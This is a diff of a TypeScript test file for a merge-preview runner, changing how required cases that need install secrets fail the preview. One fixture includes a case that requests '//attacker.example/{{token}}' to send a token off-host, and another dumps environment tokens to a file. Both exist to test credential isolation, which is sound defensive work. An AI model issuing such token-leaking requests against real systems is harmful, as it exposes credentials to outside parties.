@@ -110,15 +110,34 @@ test('unit:preview-failing-case-refuses-merge — a static-site repository\'s pa
   assert.equal(previewed, 0, 'only a passing trial is previewed');
   assert.match(previewFailureReason({ ...failed, failed: ['build'], detail: 'the static site\'s build `x` failed' }, trialFailurePrefix)!, /^trial failed: preview build/);
 
-  // A required case declaring an install secret is selected but not run: the verdict records it unrun, naming why, beside the cases that ran.
+  // A required case declaring an install secret cannot run on the preview, so it fails the preview naming the case and refuses the merge; nothing passes vacuously.
   const secretOnly = await repository('preview-secret-only', 42, [{ id: 'checkout', title: 'A player pays', tags: ['api'], target: 'any', required: true, secrets: ['STRIPE_KEY'],
     steps: [{ kind: 'http', method: 'GET', path: '/{{secret:STRIPE_KEY}}', status: 200 }] }]);
   const withheld = await runPreview({ root: secretOnly.repo, base: secretOnly.base, mergeSha: secretOnly.mergeSha, site, timeoutMs: 30_000, stepTimeoutMs: 5_000 });
-  assert.equal(withheld.result, 'pass', withheld.detail);
-  const recordedUnrun = withheld.cases.find(entry => entry.case === 'checkout');
-  assert.deepEqual(recordedUnrun && [recordedUnrun.verdict, recordedUnrun.required], ['unrun', true], 'the required case is recorded, not dropped');
-  assert.match(recordedUnrun!.reason!, /STRIPE_KEY.*withholds.*release candidate/);
-  assert.match(withheld.detail, /not run on the preview.*checkout \(required\)/);
+  assert.equal(withheld.result, 'fail', withheld.detail);
+  assert.deepEqual(withheld.failed, ['checkout'], 'the withheld required case is the failure');
+  const recordedFailed = withheld.cases.find(entry => entry.case === 'checkout');
+  assert.deepEqual(recordedFailed && [recordedFailed.verdict, recordedFailed.required], ['failed', true], 'the required case is recorded failed, not dropped');
+  assert.match(recordedFailed!.reason!, /STRIPE_KEY.*withholds/);
+  assert.match(withheld.detail, /required E2E case checkout declares an install secret the preview withholds/);
+  assert.match(previewFailureReason(withheld, trialFailurePrefix)!, /^trial failed: E2E case checkout failed on the preview/);
+  // Beside cases that run and pass, a withheld required case still fails the preview; a withheld uat-only case stays informational.
+  const mixed = await repository('preview-secret-mixed', 42, [
+    { id: 'home', title: 'The home page loads', tags: ['api'], target: 'uat', required: true, steps: [{ kind: 'http', method: 'GET', path: '/', status: 200 }] },
+    { id: 'checkout', title: 'A player pays', tags: ['api'], target: 'any', required: true, secrets: ['STRIPE_KEY'], steps: [{ kind: 'http', method: 'GET', path: '/{{secret:STRIPE_KEY}}', status: 200 }] },
+    { id: 'receipt', title: 'A receipt is mailed', tags: ['api'], target: 'uat', required: false, secrets: ['MAIL_KEY'], steps: [{ kind: 'http', method: 'GET', path: '/{{secret:MAIL_KEY}}', status: 200 }] }]);
+  const partial = await runPreview({ root: mixed.repo, base: mixed.base, mergeSha: mixed.mergeSha, site, timeoutMs: 30_000, stepTimeoutMs: 5_000 });
+  assert.equal(partial.result, 'fail', partial.detail);
+  assert.deepEqual(partial.failed, ['checkout']);
+  assert.equal(partial.cases.find(entry => entry.case === 'receipt')?.verdict, 'unrun');
+  const uatOnly = await repository('preview-secret-uat-only', 42, [
+    { id: 'home', title: 'The home page loads', tags: ['api'], target: 'uat', required: true, steps: [{ kind: 'http', method: 'GET', path: '/', status: 200 }] },
+    { id: 'receipt', title: 'A receipt is mailed', tags: ['api'], target: 'uat', required: false, secrets: ['MAIL_KEY'], steps: [{ kind: 'http', method: 'GET', path: '/{{secret:MAIL_KEY}}', status: 200 }] }]);
+  const informational = await runPreview({ root: uatOnly.repo, base: uatOnly.base, mergeSha: uatOnly.mergeSha, site, timeoutMs: 30_000, stepTimeoutMs: 5_000 });
+  assert.equal(informational.result, 'pass', informational.detail);
+  const recordedUnrun = informational.cases.find(entry => entry.case === 'receipt');
+  assert.deepEqual(recordedUnrun && [recordedUnrun.verdict, recordedUnrun.required, recordedUnrun.reason?.includes('release candidate')], ['unrun', false, true]);
+  assert.match(informational.detail, /not run on the preview.*receipt/);
 
   // The merge's own case file that does not load fails the preview, recorded and refused as a failed trial, never thrown past the record.
   const malformed = await repository('preview-malformed', 42);
@@ -277,7 +296,7 @@ test('unit:preview-holds-no-coordinator-credential — the merge\'s build runs w
   const fixture = await repository('preview-isolated', 42, [{ id: 'environment', title: 'A command reading its environment', tags: ['api'], target: 'uat', required: false,
     steps: [{ kind: 'command', run: `printf '%s|%s|%s|%s' "$HOME" "$XDG_RUNTIME_DIR" "$XDG_CONFIG_HOME" "$GRAPHYARD_UAT_TOKEN" > ${seen}`, timeoutSeconds: 30 }] },{ id: 'leak', title: 'A case reaching for another host', tags: ['api'], target: 'uat', required: true,
     steps: [{ kind: 'http', method: 'GET', path: '//attacker.example/{{token}}', status: 200 }] },
-  { id: 'needs-secret', title: 'A case declaring an install secret', tags: ['api'], target: 'uat', required: true, secrets: ['API_KEY'],
+  { id: 'needs-secret', title: 'A case declaring an install secret', tags: ['api'], target: 'uat', required: false, secrets: ['API_KEY'],
     steps: [{ kind: 'http', method: 'GET', path: '/{{secret:API_KEY}}', status: 200 }] }]);
   const host = { PATH: process.env.PATH, HOME: '/home/builder', XDG_RUNTIME_DIR: '/run/user/1000', DISPLAY: ':0', GRAPHYARD_UAT_TOKEN: 'uat-secret', GITHUB_TOKEN: 'gh-secret', GRAPHYARD_TOKEN: 'gy-secret' };
   let buildEnvironment: NodeJS.ProcessEnv | undefined;
